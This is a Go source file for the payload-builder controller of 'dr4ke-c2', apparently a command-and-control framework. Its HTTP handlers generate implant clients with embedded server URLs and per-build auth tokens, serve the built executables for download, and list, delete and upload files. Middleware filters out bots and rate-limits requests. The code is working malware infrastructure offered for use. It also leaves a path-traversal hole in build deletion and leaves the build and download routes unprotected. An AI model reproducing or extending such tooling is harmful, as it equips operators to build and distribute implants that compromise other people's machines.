package controllers

import (
	"dr4ke-c2/server/builder"
	"dr4ke-c2/server/models"
	"dr4ke-c2/server/utils"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"time"
)

type BuilderController struct {
	AuthToken       string
	BuildDirectory  string
	serverKey       string
	builder         *builder.Builder
	behaviorTracker *ClientBehaviorTracker
	rateLimiter     *RateLimiter
}

func NewBuilderController(serverKey string) *BuilderController {
	buildDir := getBuildDirectory()
	return &BuilderController{
		BuildDirectory:  buildDir,
		serverKey:       serverKey,
		builder:         builder.NewBuilder(),
		behaviorTracker: NewClientBehaviorTracker(),
		rateLimiter:     NewRateLimiter(),
	}
}
func (c *BuilderController) BuildClient(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		utils.RespondWithError(w, http.StatusMethodNotAllowed, "Method not allowed")
		return
	}
	var options builder.BuildOptions
	if err := json.NewDecoder(r.Body).Decode(&options); err != nil {
		utils.RespondWithError(w, http.StatusBadRequest, fmt.Sprintf("Invalid request body: %v", err))
		return
	}
	token, err := utils.GenerateSecureToken(32)
	if err != nil {
		utils.RespondWithError(w, http.StatusInternalServerError, "Failed to generate token")
		return
	}
	timestamp := time.Now().Format("20060102-150405")
	buildID := fmt.Sprintf("dr4ke-client-%s", timestamp)
	options.OutputName = buildID
	if err := c.saveTokenInfo(buildID, token); err != nil {
		utils.RespondWithError(w, http.StatusInternalServerError, "Failed to save token info")
		return
	}
	options = c.prepareBuildOptions(options, r)
	options.AuthToken = token
	result, err := c.builder.BuildPayload(options)
	if err != nil {
		utils.RespondWithJSON(w, http.StatusInternalServerError, result)
		return
	}
	utils.RespondWithJSON(w, http.StatusOK, result)
}
func (c *BuilderController) DownloadClient(w http.ResponseWriter, r *http.Request) {
	clientName := c.validateClientName(w, r)
	if clientName == "" {
		return
	}
	filePath := c.getClientFilePath(clientName)
	if !c.validateFilePath(w, filePath) {
		return
	}
	c.serveClientFile(w, r, filePath)
}
func (c *BuilderController) GetBuilderInfo(w http.ResponseWriter, r *http.Request) {
	builds, err := getAvailableBuilds(c.BuildDirectory)
	if err != nil {
		utils.RespondWithError(w, http.StatusInternalServerError, fmt.Sprintf("Failed to get available builds: %v", err))
		return
	}
	utils.RespondWithJSON(w, http.StatusOK, map[string]interface{}{
		"buildDirectory": c.BuildDirectory,
		"builds":         builds,
	})
}
func (c *BuilderController) DeleteBuildHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodDelete {
		utils.RespondWithError(w, http.StatusMethodNotAllowed, "Method not allowed")
		return
	}

	filename := r.URL.Query().Get("name")
	if filename == "" {
		utils.RespondWithError(w, http.StatusBadRequest, "Filename is required")
		return
	}

	if err := c.deleteBuildFile(filename); err != nil {
		utils.RespondWithError(w, http.StatusInternalServerError, err.Error())
		return
	}

	utils.RespondWithJSON(w, http.StatusOK, map[string]bool{"success": true})
}
func (c *BuilderController) BotProtectionMiddleware(next http.HandlerFunc) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		if c.shouldBypassProtection(r) {
			next(w, r)
			return
		}
		if c.validateServerKey(r) {
			next(w, r)
			return
		}
		if !c.rateLimiter.Allow(r) {
			utils.RespondWithError(w, http.StatusTooManyRequests, "Rate limit exceeded")
			return
		}
		if c.isBotRequest(r) {
			utils.RespondWithError(w, http.StatusForbidden, "Access denied")
			return
		}
		if !c.behaviorTracker.UpdateBehavior(r) {
			utils.RespondWithError(w, http.StatusTooManyRequests, "Suspicious activity detected")
			return
		}
		c.addSecurityHeaders(w, r)
		next(w, r)
	}
}
func getAuthToken() string {
	token := os.Getenv("DR4KE_AUTH_TOKEN")
	if token == "" {
		var err error
		token, err = utils.GenerateSecureToken(32)
		if err != nil {
			utils.LogOutput("[ERROR] Failed to generate authentication token: %v", err)
			os.Exit(1)
		}
		utils.LogOutput("[INFO] Generated authentication token: %s", token)
	}
	return token
}
func getBuildDirectory() string {
	serverCwd, err := os.Getwd()
	if err != nil {
		utils.LogOutput("[ERROR] Failed to get server working directory: %v", err)
		os.Exit(1)
	}
	buildsAbsDir := filepath.Join(serverCwd, "builds")
	if err := os.MkdirAll(buildsAbsDir, 0755); err != nil {
		utils.LogOutput("[WARNING] Failed to create build directory %s: %v", buildsAbsDir, err)
	}
	return buildsAbsDir
}
func (c *BuilderController) prepareBuildOptions(options builder.BuildOptions, r *http.Request) builder.BuildOptions {
	if options.ServerURL == "" {
		host := r.Host
		scheme := "http"
		if r.TLS != nil {
			scheme = "https"
		}
		options.ServerURL = fmt.Sprintf("%s://%s", scheme, host)
	}
	options.OutputDirectory = c.BuildDirectory
	return options
}
func (c *BuilderController) validateClientName(w http.ResponseWriter, r *http.Request) string {
	clientNameRaw := r.URL.Query().Get("name")
	clientName := filepath.Base(clientNameRaw)
	if clientName == "" {
		utils.RespondWithError(w, http.StatusBadRequest, "Client name is required")
		return ""
	}
	return clientName
}
func (c *BuilderController) getClientFilePath(clientName string) string {
	filePath := filepath.Join(c.BuildDirectory, clientName)
	if !strings.HasSuffix(filePath, ".exe") && runtime.GOOS == "windows" {
		filePath += ".exe"
	}
	return filePath
}
func (c *BuilderController) validateFilePath(w http.ResponseWriter, filePath string) bool {
	if _, err := os.Stat(filePath); os.IsNotExist(err) {
		utils.RespondWithError(w, http.StatusNotFound, "Client not found")
		return false
	} else if err != nil {
		utils.RespondWithError(w, http.StatusInternalServerError, "Error accessing file")
		return false
	}
	return true
}
func (c *BuilderController) serveClientFile(w http.ResponseWriter, r *http.Request, filePath string) {
	w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=%s", filepath.Base(filePath)))
	w.Header().Set("Content-Type", "application/octet-stream")
	http.ServeFile(w, r, filePath)
}
func (c *BuilderController) deleteBuildFile(filename string) error {
	filePath := filepath.Join(c.BuildDirectory, filename)
	if _, err := os.Stat(filePath); os.IsNotExist(err) {
		return fmt.Errorf("file not found")
	} else if err != nil {
		return fmt.Errorf("error accessing file: %v", err)
	}
	if err := os.Remove(filePath); err != nil {
		return fmt.Errorf("failed to delete file: %v", err)
	}
	return nil
}
func (c *BuilderController) shouldBypassProtection(r *http.Request) bool {
	alwaysBypassPaths := map[string]bool{
		"/builder-info": true,
		"/download":     true,
		"/build":        true,
	}
	return alwaysBypassPaths[r.URL.Path]
}
func (c *BuilderController) validateServerKey(r *http.Request) bool {
	if serverKeyFromContext, ok := r.Context().Value("ServerKey").(string); ok {
		return serverKeyFromContext == c.serverKey
	}
	return false
}
func (c *BuilderController) isBotRequest(r *http.Request) bool {
	userAgent := r.Header.Get("User-Agent")
	return userAgent == "" || strings.Contains(strings.ToLower(userAgent), "bot")
}
func (c *BuilderController) addSecurityHeaders(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("X-Content-Type-Options", "nosniff")
	w.Header().Set("X-Frame-Options", "DENY")
	w.Header().Set("X-XSS-Protection", "1; mode=block")
	w.Header().Set("Strict-Transport-Security", "max-age=31536000; includeSubDomains")
	w.Header().Set("X-RateLimit-Limit", fmt.Sprintf("%d", maxCommandsPerMinute))
	w.Header().Set("X-RateLimit-Remaining", fmt.Sprintf("%d", maxCommandsPerMinute-c.behaviorTracker.GetCommandCount(r)))
}
func getAvailableBuilds(buildDir string) ([]map[string]interface{}, error) {
	files, err := ioutil.ReadDir(buildDir)
	if err != nil {
		return nil, err
	}
	builds := make([]map[string]interface{}, 0)
	for _, file := range files {
		if file.IsDir() {
			continue
		}
		builds = append(builds, map[string]interface{}{
			"name":      file.Name(),
			"size":      file.Size(),
			"createdAt": file.ModTime(),
		})
	}
	return builds, nil
}
func (c *BuilderController) saveTokenInfo(buildID, token string) error {
	var tokenStore models.TokenStore
	data, err := os.ReadFile("auth-token.json")
	if err == nil {
		if err := json.Unmarshal(data, &tokenStore); err != nil {
			return err
		}
	}
	tokenStore.Tokens = append(tokenStore.Tokens, models.TokenEntry{
		BuildID:  buildID,
		Token:    token,
		Created:  time.Now(),
		IsActive: true,
	})
	data, err = json.MarshalIndent(tokenStore, "", "  ")
	if err != nil {
		return err
	}

	return os.WriteFile("auth-token.json", data, 0644)
}
func (c *BuilderController) HandleUpload(w http.ResponseWriter, r *http.Request) {
	uploadController := NewUploadController("static/uploads")
	uploadController.HandleUpload(w, r)
}
